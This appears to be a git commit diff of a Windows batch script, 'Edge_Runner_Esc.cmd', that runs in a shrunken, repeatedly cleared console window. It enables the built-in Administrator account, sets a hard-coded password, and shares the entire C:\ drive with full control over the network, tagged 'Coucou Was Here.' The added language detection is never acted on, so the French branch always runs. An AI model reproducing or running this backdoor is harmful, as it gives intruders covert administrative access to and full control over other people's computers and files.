cf6b48f8cea56d87165cfa780075e1ccb238487d
Nikki-Devil <nikkidevil.rei@gmail.com>
2023-11-28 10:08:32 +0100

    Added Lang support + SMB-share equivalent

--- bgmorito_29-11-23/Edge_Runner_Esc.cmd
+++ bgmorito_29-11-23/Edge_Runner_Esc.cmd
@@ -4,13 +4,35 @@ title Edge_Runner
 cls
 mode con: cols=15 lines=1
 cls
-net user Administrateur CoucouWas-hereAdmin
+find /i "Administrateur" C:\Temp\idc_9.txt && ( set lang=FR )
 cls
-net user Administrator CoucouWas-hereAdmin
+find /i "Administrator" C:\Temp\idc_9.txt && ( set lang=EN )
 cls
-net user Administrateur /active:yes
-cls
-net user Administrator /active:yes
-cls
+
+:AdminFr
+    cls
+	net user Administrateur /active:yes
+	cls
+	net user Administrateur CoucouWas-hereAdmin
+	cls
+    net share bgmorito=C:\ /GRANT:Administrateurs,FULL /remark:"Coucou Was Here."
+    cls
+	goto SkipLang
+	cls
+
+:AdminEn
+	cls
+	net user Administrator /active:yes
+	cls
+	net user Administrator CoucouWas-hereAdmin
+	cls
+    net share bgmorito=C:\ /GRANT:Administrators,FULL /remark:"Coucou Was Here."
+    cls
+	goto SkipLang
+	cls
+
+:SkipLang
+    cls
+
 exit
 cls
